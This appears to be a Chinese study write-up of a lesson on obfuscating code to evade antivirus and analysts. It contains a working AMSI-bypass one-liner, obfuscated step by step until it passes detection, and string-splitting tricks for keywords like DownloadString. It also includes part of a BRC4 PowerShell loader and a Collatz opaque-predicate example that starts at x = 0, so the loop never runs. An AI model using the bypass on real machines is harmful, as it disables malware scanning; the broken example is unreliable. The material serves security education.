<p>当使用 Yara 扫描编译后的二进制文件时，如果存在定义的字符串，它将创建积极的警报/检测。通过连接，字符串在功能上可以相同，但在扫描时会显示为两个独立的字符串，从而不会触发警报。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 原代码</span></span>
<span class="line"><span style="color: #ABB2BF">IntPtr ASBPtr </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">TargetDLL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;AmsiScanBuffer&quot;</span><span style="color: #ABB2BF">); </span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 输入字符串拼接</span></span>
<span class="line"><span style="color: #ABB2BF">IntPtr ASBPtr </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">TargetDLL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;Amsi&quot;</span><span style="color: #E06C75"> </span><span style="color: #C678DD">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;Scan&quot;</span><span style="color: #E06C75"> </span><span style="color: #C678DD">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;Buffer&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>从字符串拼接技术延伸，攻击者还可以使用<strong>无效字符</strong>（或<strong>填充字符</strong>）来干扰或混淆静态签名。这些字符可以单独使用，也可以与字符串拼接结合使用，具体取决于签名的强度和实现方式。下表列出了一些我们可以利用的常见无效字符。</p>
<table>
<thead>
<tr>
<th>**Character **</th>
<th>**Purpose **</th>
<th><strong>Example</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>分隔</td>
<td>将单个字符串拆分为多个子字符串并进行组合</td>
<td><code>('co'+'ffe'+'e')</code></td>
</tr>
<tr>
<td>重排</td>
<td>重新排列字符串的组成部分</td>
<td><code>('&#123;1&#125;&#123;0&#125;'-f'ffee','co')</code></td>
</tr>
<tr>
<td>空白字符</td>
<td>包含未被解析的空白字符</td>
<td><code>.( 'Ne' +'w-Ob' + 'ject')</code></td>
</tr>
<tr>
<td>反引号（Tick）</td>
<td>包含未被解析的反引号</td>
<td><code>d</code>own<code>LoAd</code>Stri<code>ng</code></td>
</tr>
<tr>
<td>随机大小写</td>
<td>Tokens 通常不区分大小写，可以是任意大小写形式</td>
<td><code>dOwnLoAdsTRing</code></td>
</tr>
</tbody>
</table>
<h4 id="实践-2">实践</h4>
<p>混淆这段代码试试，我估计就是 <code>Amsi</code> 这种关键字作祟。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;amsiInitFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">).SetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 第一版</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;Sys&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tem.Manag&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ement.Au&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tomation.Am&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;siU&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;am&#39;</span><span style="color: #56B6C2">+</span><span style="color: #98C379">&#39;siIn&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;itFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonP&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ublic,S&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tatic&#39;</span><span style="color: #ABB2BF">).SetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 失败了，拆解一下检测点看看</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这个不能过</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这个能过</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;Sys&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tem.Manag&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ement.Au&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tomation.Am&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;siU&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tils&#39;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这个也能过</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;Sys&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tem.Manag&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ement.Au&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tomation.Am&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;siU&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;am&#39;</span><span style="color: #56B6C2">+</span><span style="color: #98C379">&#39;siIn&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;itFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonP&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ublic,S&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tatic&#39;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 那就是最后一部分了</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这里检测的其实是 SetValue，可以把这个抽离出来作为变量传进去</span></span>
<span class="line"><span style="color: #E06C75">$Value</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;SetValue&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;Sys&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tem.Manag&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ement.Au&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tomation.Am&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;siU&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;am&#39;</span><span style="color: #56B6C2">+</span><span style="color: #98C379">&#39;siIn&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;itFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonP&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ublic,S&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tatic&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #E06C75">$Value</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>
<h2 id="Obfuscation’s-Function-for-Analysis-Deception-混淆在分析欺骗中的作用">Obfuscation’s Function for Analysis Deception 混淆在分析欺骗中的作用</h2>
<p>虽然混淆能绕过软件检测，但是他依然会被人为检测到（毕竟人不是死的），所以可以利用一些逻辑和数学去创建一些难以理解的代码。</p>
<p>如果你想知道更多的逆向知识，推荐完成<a target="_blank" rel="noopener" href="https://tryhackme.com/module/malware-analysis">恶意软件分析模块</a>。</p>
<p>下表列出了分类法中混淆布局和混淆控制子层所涵盖的方法。</p>
<table>
<thead>
<tr>
<th><strong>混淆方法</strong></th>
<th><strong>目的</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>垃圾代码</td>
<td>添加没有用的垃圾指令，也叫代码存根</td>
</tr>
<tr>
<td>分离相关代码</td>
<td>分离相关代码或者指令，增加阅读程序的难度</td>
</tr>
<tr>
<td>剥离冗余符号</td>
<td>剥离符号信息，例如调试信息或其他符号表</td>
</tr>
<tr>
<td>无意义标识符</td>
<td>将有意义的标识符转换为无意义的标识符</td>
</tr>
<tr>
<td>隐式控制</td>
<td>将显式控制指令转换为隐式指令</td>
</tr>
<tr>
<td>基于调度器的控制</td>
<td>在运行时确定要执行的下一个块</td>
</tr>
<tr>
<td>概率控制流</td>
<td>引入具有相同语义但不同语法的控制流</td>
</tr>
<tr>
<td>虚假控制流</td>
<td>故意添加到程序中但永不执行的控制流</td>
</tr>
</tbody>
</table>
<p>上面的只是给一个概念性的认知，每种技术都有挺深的运用了，就留给你们自己探索了。如果碰到不懂的概念要及时查清楚，就比如标识符和符号的区别是什么。</p>
<h3 id="Code-Flow-and-Logic-代码流和逻辑">Code Flow and Logic 代码流和逻辑</h3>
<p><strong>控制流</strong>是程序执行的骨架，它决定了代码的逻辑走向，比如 <code>if/else</code> 判断和循环。程序通常自上而下执行，直到遇到逻辑语句。**控制流图（CFG）**就是用来可视化这些逻辑路径的。</p>
<p><strong>攻击者如何利用控制流？</strong></p>
<p>对攻击者来说，控制流既是一个挑战，也是一个机会。安全分析师可以通过分析程序的控制流来理解其功能，这会暴露恶意意图。</p>
<p>然而，攻击者可以利用这一点，通过<strong>操纵控制流</strong>来混淆代码。他们的目标是引入<strong>复杂且无意义的逻辑</strong>，使得控制流变得<strong>任意混乱</strong>。这会：</p>
<ul>
<li><strong>迷惑分析师</strong>：让逆向工程师很难看懂代码的真实执行路径。</li>
<li><strong>规避检测</strong>：通过改变代码的结构，使其不再符合杀毒软件已知的恶意行为模式。</li>
</ul>
<h4 id="Arbitrary-Control-Flow-Patterns-任意控制流模式">Arbitrary Control Flow Patterns 任意控制流模式</h4>
<p>**任意控制流（Arbitrary Control Flow）**指的是恶意软件开发者通过人为设计和混淆，使程序的执行路径变得复杂、非线性、难以预测和分析。</p>
<p>为了实现这种复杂的控制流，开发者会利用数学、逻辑或其他复杂算法，将不同的控制流模式注入到恶意代码中。这些算法的核心是<strong>谓词（Predicates）</strong>，即那些只返回真或假值的判断式。从高层次看，我们可以将谓词理解为 <code>if</code> 语句中的条件，它决定了代码块是否执行。</p>
<h5 id="不透明谓词-Opaque-Predicates"><strong>不透明谓词 (Opaque Predicates)</strong></h5>
<p>在混淆技术中，<strong>不透明谓词</strong>是实现任意控制流的关键。正如之前提到的那篇论文所指出的，不透明谓词是一种<strong>其值对开发者已知但难以被逆向分析者推断</strong>的谓词。</p>
<p>举例来说，一个不透明谓词的数学表达式可能非常复杂，但开发者知道它的结果永远为真。当分析师试图理解这段代码时，他们会认为这里存在两种执行路径，但实际上只有一条是可行的。</p>
<p>不透明谓词属于<strong>虚假控制流</strong>和<strong>概率控制流</strong>方法。它可以与<strong>垃圾代码</strong>等其他混淆方法无缝结合，任意地向程序中添加虚假逻辑，或重构现有函数的控制流，从而使逆向工程变得异常艰巨。</p>
<p>虽然深入研究不透明谓词需要扎实的数学和计算基础，但在后续的分析中，我们将观察它的一个常见应用示例。</p>
<h5 id="考拉兹猜想（The-Collatz-Conjecture）">考拉兹猜想（The Collatz Conjecture）</h5>
<p><strong>考拉兹猜想</strong>是一个常被用作不透明谓词的数学问题。该猜想指出，如果对任意一个正整数重复应用以下两个算术运算，最终都将得到 1。</p>
<ul>
<li><strong>如果该数为偶数，将其除以 2。</strong></li>
<li><strong>如果该数为奇数，将其乘以 3 再加 1。</strong></li>
</ul>
<p>这个猜想的可用之处在于，我们已知对于任何正整数输入，其输出结果最终都将是 1。这个确定的输出使得它成为一个可靠的<strong>不透明谓词</strong>。</p>
<p>下面是考拉兹猜想在 Python 中的示例。</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">x </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span>
<span class="line"><span style="color: #C678DD">while</span><span style="color: #ABB2BF">(x </span><span style="color: #56B6C2">&gt;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">):</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(x</span><span style="color: #56B6C2">%</span><span style="color: #D19A66">2</span><span style="color: #56B6C2">==</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">):</span></span>
<span class="line"><span style="color: #ABB2BF">		x</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">x</span><span style="color: #56B6C2">*</span><span style="color: #D19A66">3</span><span style="color: #56B6C2">+</span><span style="color: #D19A66">1</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">else</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">		x</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">x</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(x</span><span style="color: #56B6C2">==</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">):</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;hello!&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>
<p><code>while (x &gt; 1)</code> 这个条件就是我们所说的<strong>谓词</strong>。考拉兹猜想的数学特性保证了，只要 <code>x</code> 是一个大于 1 的正整数，这个循环最终都会结束，并且 <code>x</code> 的值会变为 <code>1</code>。也就是说，<code>x &gt; 1</code> 这个条件最终会变为假，但它<strong>必然会执行</strong>循环体内的代码。</p>
<p>对于开发者来说，他们知道这个循环最终会结束。但对于<strong>静态分析</strong>工具或逆向分析师来说，他们无法轻易地推断出这个循环何时会结束，或者 <code>x</code> 的最终值是什么。这段代码的逻辑看似复杂，但它的最终结果是<strong>确定且可预测</strong>的。</p>
<h3 id="Protecting-and-Stripping-Identifiable-Information-保护和剥离可识别信息">Protecting and Stripping Identifiable Information 保护和剥离可识别信息</h3>
<p><strong>可识别信息</strong>是逆向分析恶意软件的关键线索。通过隐藏或剥离这些信息，攻击者可以极大地增加分析师理解程序功能的难度。这些可识别信息主要分为三类：<strong>代码结构</strong>、<strong>对象名称</strong>（Object Names）和<strong>文件/编译属性</strong>。</p>
<h4 id="对象名称混淆"><strong>对象名称混淆</strong></h4>
<p>对象名称，如变量名和函数名，能直接揭示代码的用途。尽管分析师可以通过行为分析来推断其功能，但如果没有这些上下文，难度会呈指数级上升。这种混淆方法也被称为<strong>词法混淆（Lexical Obfuscation）</strong>，它将有意义的标识符（例如，<code>checkPassword</code>）转换为无意义的名称（例如，<code>a</code> 或 <code>_123</code>）。</p>
<ul>
<li><strong>编译型语言 vs. 解释型语言</strong>：
<ul>
<li>在 <strong>Python</strong> 或 <strong>PowerShell</strong> 等<strong>解释型语言</strong>中，所有对象名称在运行时都可见，因此所有名称都必须被混淆。</li>
<li>在 <strong>C</strong> 或 <strong>C++</strong> 等<strong>编译型语言</strong>中，大多数本地变量名会在编译时被丢弃，但全局变量和函数名通常会保留在二进制文件中。此外，出现在字符串中的对象名称也需要特别处理，因为它们在运行时会被保留。</li>
</ul>
</li>
<li><strong>混淆技术</strong>：为了使混淆后的标识符更具迷惑性，攻击者会故意使用相同的名称来命名不同类型或不同作用域的对象。这种方法已被像 <strong>ProGuard</strong> 这样的 Java 混淆工具所采用。</li>
</ul>
<h4 id="剥离符号信息"><strong>剥离符号信息</strong></h4>
<p>优秀的编程实践通常会采用有意义的命名规则，并且在编译后的软件中默认保留一些名称（如 C/C++ 的全局变量名、Java 的所有名称）。这些有意义的名称会为逆向分析提供便利。因此，为了对抗分析，开发者会**混淆或剥离（Strip）**这些可识别信息，以防止它们暴露程序的原始功能。</p>
<p>作为解释型语言的一个例子，我们可以观察 BRC4 社区套件中已弃用的 Badger PowerShell 加载器。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">Set-StrictMode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Version </span><span style="color: #D19A66">2</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Ait1m</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x3d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x51</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x52</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$ahv3I</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x34</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x58</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x64</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Moo5y</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x64</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x52</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x64</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$ooR5o</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x2e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">)</span></span>
